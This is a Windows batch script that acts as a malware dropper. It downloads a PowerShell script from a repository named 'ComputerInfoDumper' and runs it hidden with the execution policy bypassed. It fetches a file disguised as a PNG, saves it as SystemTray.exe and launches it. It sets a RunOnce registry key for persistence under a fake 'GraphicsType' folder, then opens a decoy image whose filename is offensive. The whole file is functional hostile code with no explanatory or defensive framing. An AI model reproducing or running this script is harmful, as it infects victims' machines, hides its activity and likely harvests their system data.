@echo off
mkdir %programdata%\GraphicsType
echo @echo off > %programdata%\GraphicsType\SystemTray.bat
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v SystemTray /t REG_SZ /d %programdata%\GraphicsType\SystemTray.bat >> %programdata%\GraphicsType\SystemTray.bat
curl -X GET https://cdn.discordapp.com/attachments/1123352422614573067/1152607479717433425/SPOILER_cambre.jpg -o %temp%\pedo.jpg
curl -X GET https://raw.githubusercontent.com/dazd-pkz/ComputerInfoDumper/main/ssg-008.ps1 -o %temp%\script.ps1
powershell.exe saps cmd.exe '/c %windir%\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass %temp%\script.ps1' -WindowStyle Hidden
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v SystemTray /t REG_SZ /d %programdata%\GraphicsType\SystemTray.bat
curl -X GET https://files.catbox.moe/m3krrp.png -o %programdata%\GraphicsType\SystemTray.exe
start explorer.exe %programdata%\GraphicsType\SystemTray.exe
start %temp%\pedo.jpg
